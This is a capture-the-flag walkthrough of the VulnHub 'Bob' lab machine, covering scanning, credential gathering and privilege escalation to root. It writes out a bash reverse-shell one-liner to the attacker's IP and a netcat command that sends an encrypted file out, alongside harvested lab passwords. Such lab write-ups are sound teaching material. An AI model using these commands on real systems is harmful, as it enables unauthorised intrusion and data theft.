# Bob | VulnHub
https://www.vulnhub.com/entry/bob-101,226/

### 1. Scan
```bash
# Nmap 7.91 scan initiated Sat Jul 10 02:00:43 2021 as: nmap -vv -A -p- -oG /home/kali/Desktop/results/192.168.34.145/scans/gnmap/_full_tcp_nmap.gnmap -oN /home/kali/Desktop/results/192.168.34.145/scans/_full_tcp_nmap.txt -oX /home/kali/Desktop/results/192.168.34.145/scans/xml/_full_tcp_nmap.xml 192.168.34.145
Nmap scan report for 192.168.34.145
Host is up, received arp-response (0.00100s latency).
Scanned at 2021-07-10 02:00:44 EDT for 13s
Not shown: 65532 closed ports
Reason: 65532 resets
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 64 ProFTPD 1.3.5b
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
| http-robots.txt: 4 disallowed entries 
| /login.php /dev_shell.php /lat_memo.html 
|_/passwords.html
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
25468/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 84:f2:f8:e5:ed:3e:14:f3:93:d4:1e:4c:41:3b:a2:a9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCt2rmQKSTx+fbTOy3a0DG0GI5KOP+x81YHI31kH8V+gXu+BhrvzTtvQbg/KUaxkxNXirQKm3v23b/BNGLm2EmG28T8H1kisT5LhmfJ+w1X/Y7xnXiTYxwxKWF8NHMsQGIKWB8bCPK+2LvG3MdF6cKniSIiT8C8N66F6yTPQyuW9z68pK7Zj4wm0nrkvQ9Mr++Kj4A4WIhxaYd0+hPnSUNIGLr+XC7mRVUtDSvfP0RqguibeQ2yoB974ZTF0uU0Zpq7BK8/loAl4nFu/6vwLU7BjYm3BlU3fvjDNlSwqbsjwgn/kTfySxZ/WiifZW3U1WLLdY4CQZ++nR2odDNy8YQb
|   256 5b:98:c7:4f:84:6e:fd:56:6a:35:16:83:aa:9c:ea:f8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIntdI8IcX2n63A3tEIasPt0W0Lg31IAVGyzesYMblJsc1zM1jmaJ9d6w6PpZKa+7Ow/5yXX2DOF03pAHXP1S5A=
|   256 39:16:56:fb:4e:0f:50:85:40:d3:53:22:41:43:38:15 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMmbgZpOuy0D5idStSgBUVb4JjRuAdv/7XF5dGDJgUqE
MAC Address: 00:0C:29:66:3E:23 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/10%OT=21%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=000C29%TM=60E
OS:93799%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8
OS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B
OS:4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120
OS:)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%
OS:Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=N)IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 198.839 days (since Wed Dec 23 04:53:12 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.00 ms 192.168.34.145

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 10 02:00:58 2021 -- 1 IP address (1 host up) scanned in 14.92 seconds
```
The machine is running ProFTPd 1.3.5b, an Apache HTTP server and SSH on a high port.

### 2. Enumeration
Didn't need to do any dirbusting this time, there is a webshell already available at the /dev_shell.php page. Before going there check out some other parts of the school website. The login.html page is disabled due to a previous breach but has the following comment in the source:
```html
<!-- If you are the new IT staff I have sent a letter to you about a web shell you can use
    -Bob
   -->
```

Also in robots.txt there is a passwords.html with the following content:  
  
*Really who made this file at least get a hash of your password to display,  hackers can't do anything with a hash, this is probably why we had a security  breach in the first place. Comeon  people this is basic 101 security! I have moved the file off the server. Don't make me have to clean up the mess everytime  someone does something as stupid as this. We will have a meeting about this and other  stuff I found on the server. >:( -Bob*
  
### 3. Get a shell
Spawn a shell within a listener by going to the /dev_shell.php page and running `bash -c "bash -i >& /dev/tcp/192.168.34.138/9999 0>&1"`
```bash
www-data@Milburg-High:/var/www/html$ whoami
www-data
```

### 4. Enumerate from foothold
```bash
www-data@Milburg-High:/var/www/html$ sudo -l 
Matching Defaults entries for www-data on Milburg-High:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on Milburg-High:
    (ALL) NOPASSWD: /usr/bin/service apache2 *
    (root) NOPASSWD: /bin/systemctl start ssh

www-data@Milburg-High:/var/www/html$ sudo /bin/systemctl start ssh
sudo /bin/systemctl start ssh
```

SSH can be started from this user - but I never end up actually using it, just use su to get between users. All user home folders are readable, some the elliot user has an angry text file in his.
```bash
www-data@Milburg-High:/home$ cat elliot/theadminisdumb.txt
The admin is dumb,
In fact everyone in the IT dept is pretty bad but I can’t blame all of them the newbies Sebastian and James are quite new to 
managing a server so I can forgive them for that password file they made on the server. But the admin now he’s quite something.
Thinks he knows more than everyone else in the dept, he always yells at Sebastian and James now they do some dumb stuff but 
their new and this is just a high-school server who cares, the only people that would try and hack into this are script kiddies. 
His wallpaper policy also is redundant, why do we need custom wallpapers that doesn’t do anything. I have been suggesting time
and time again to Bob ways we could improve the security since he “cares” about it so much but he just yells at me and says I 
don’t know what i’m doing. Sebastian has noticed and I gave him some tips on better securing his account, I can’t say the same 
for his friend James who doesn’t care and made his password: Qwerty. To be honest James isn’t the worst bob is his stupid web 
shell has issues and I keep telling him what he needs to patch but he doesn’t care about what I have to say. it’s only a matter 
of time before it’s broken into so because of this I have changed my password to

theadminisdumb

I hope bob is fired after the future second breach because of his incompetence. I almost want to fix it myself but at the same 
time it doesn’t affect me if they get breached, I get paid, he gets fired it’s a good time.
```
Two sets of creds in here: `jc:qwerty` (james is jc in /etc/passwd) and `elliot:theadminisdumb`.  
Looking in bob's directory, find a hidden file referring to the old password file that was copied out of the site.
```bash
www-data@Milburg-High:/home/bob$ ls -la
total 172
drwxr-xr-x 18 bob  bob   4096 Mar  8  2018 .
drwxr-xr-x  6 root root  4096 Mar  4  2018 ..
-rw-------  1 bob  bob   1980 Mar  8  2018 .ICEauthority
-rw-------  1 bob  bob    214 Mar  8  2018 .Xauthority
-rw-------  1 bob  bob   6403 Mar  8  2018 .bash_history
-rw-r--r--  1 bob  bob    220 Feb 21  2018 .bash_logout
-rw-r--r--  1 bob  bob   3548 Mar  5  2018 .bashrc
drwxr-xr-x  7 bob  bob   4096 Feb 21  2018 .cache
drwx------  8 bob  bob   4096 Feb 27  2018 .config
-rw-r--r--  1 bob  bob     55 Feb 21  2018 .dmrc
drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 .ftp
drwx------  3 bob  bob   4096 Mar  5  2018 .gnupg
drwxr-xr-x  3 bob  bob   4096 Feb 21  2018 .local
drwx------  4 bob  bob   4096 Feb 21  2018 .mozilla
drwxr-xr-x  2 bob  bob   4096 Mar  4  2018 .nano
-rw-r--r--  1 bob  bob     72 Mar  5  2018 .old_passwordfile.html
-rw-r--r--  1 bob  bob    675 Feb 21  2018 .profile
drwx------  2 bob  bob   4096 Mar  5  2018 .vnc
-rw-r--r--  1 bob  bob  25211 Mar  8  2018 .xfce4-session.verbose-log
-rw-r--r--  1 bob  bob  27563 Mar  7  2018 .xfce4-session.verbose-log.last
-rw-------  1 bob  bob   3672 Mar  8  2018 .xsession-errors
-rw-------  1 bob  bob   2866 Mar  7  2018 .xsession-errors.old
drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Desktop
drwxr-xr-x  3 bob  bob   4096 Mar  5  2018 Documents
drwxr-xr-x  3 bob  bob   4096 Mar  8  2018 Downloads
drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Music
drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Pictures
drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Public
drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Templates
drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Videos
www-data@Milburg-High:/home/bob$ cat .old_passwordfile.html
cat .old_passwordfile.html
<html>
<p>
jc:Qwerty
seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
</p>
</html>

```
This give the creds for seb - `seb:T1tanium_Pa$$word_Hack3rs_Fear_M3`. I can switch to the seb user with `su - seb`, but not extra access is given. Continuing enumeration, bob has a bunch of nested folders in his Documents directory, along with an encrypted login.txt.gpg.
```bash
seb@Milburg-High:~/Documents$ ls -laR
.:
total 20
drwxr-xr-x  3 bob bob 4096 Mar  5  2018 .
drwxr-xr-x 18 bob bob 4096 Mar  8  2018 ..
-rw-r--r--  1 bob bob   91 Mar  5  2018 login.txt.gpg
drwxr-xr-x  3 bob bob 4096 Mar  5  2018 Secret
-rw-r--r--  1 bob bob  300 Mar  4  2018 staff.txt

./Secret:
total 12
drwxr-xr-x 3 bob bob 4096 Mar  5  2018 .
drwxr-xr-x 3 bob bob 4096 Mar  5  2018 ..
drwxr-xr-x 4 bob bob 4096 Mar  5  2018 Keep_Out

./Secret/Keep_Out:
total 16
drwxr-xr-x 4 bob bob 4096 Mar  5  2018 .
drwxr-xr-x 3 bob bob 4096 Mar  5  2018 ..
drwxr-xr-x 3 bob bob 4096 Mar  5  2018 Not_Porn
drwxr-xr-x 2 bob bob 4096 Mar  5  2018 Porn

./Secret/Keep_Out/Not_Porn:
total 12
drwxr-xr-x 3 bob bob 4096 Mar  5  2018 .
drwxr-xr-x 4 bob bob 4096 Mar  5  2018 ..
drwxr-xr-x 2 bob bob 4096 Mar  5  2018 No_Lookie_In_Here

./Secret/Keep_Out/Not_Porn/No_Lookie_In_Here:
total 12
drwxr-xr-x 2 bob bob 4096 Mar  5  2018 .
drwxr-xr-x 3 bob bob 4096 Mar  5  2018 ..
-rwxr-xr-x 1 bob bob  438 Mar  5  2018 notes.sh
```

The notes.sh has the following:
```bash
#!/bin/bash
clear
echo "-= Notes =-"
echo "Harry Potter is my faviorite"
echo "Are you the real me?"
echo "Right, I'm ordering pizza this is going nowhere"
echo "People just don't get me"
echo "Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh <sea santy here>"
echo "Cucumber"
echo "Rest now your eyes are sleepy"
echo "Are you gonna stop reading this yet?"
echo "Time to fix the server"
echo "Everyone is annoying"
echo "Sticky notes gotta buy em"
```
Note the capitalised letters which spell out "HARPOCRATES".  
Send the login.txt.gpg file to the local machine via Netcat:
```bash
seb@Milburg-High:/home/bob/Documents$ nc 192.168.34.138 9998 < login.txt.gpg
```
Recieve it on the local machine and decrypt the file with the password "HARPOCRATES".
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ nc -lvnp 9998 > login.txt.gpg                                                   
listening on [any] 9998 ...
connect to [192.168.34.138] from (UNKNOWN) [192.168.34.145] 46242
^C
                                                                                                                                                                   
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ gpg --decrypt login.txt.gpg
gpg: AES encrypted data
gpg: encrypted with 1 passphrase
bob:b0bcat_
```

### 5. Escalate to root
Switch over to bob. Checking the sudo permissions, bob can run anything as root.
```bash
www-data@Milburg-High:/var/www/html$ su - bob
Password: b0bcat_

bob@Milburg-High:~$ sudo -l
[sudo] password for bob: b0bcat_

Matching Defaults entries for bob on Milburg-High:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bob may run the following commands on Milburg-High:
    (ALL : ALL) ALL
bob@Milburg-High:~$ sudo -i
root@Milburg-High:~# whoami
root
```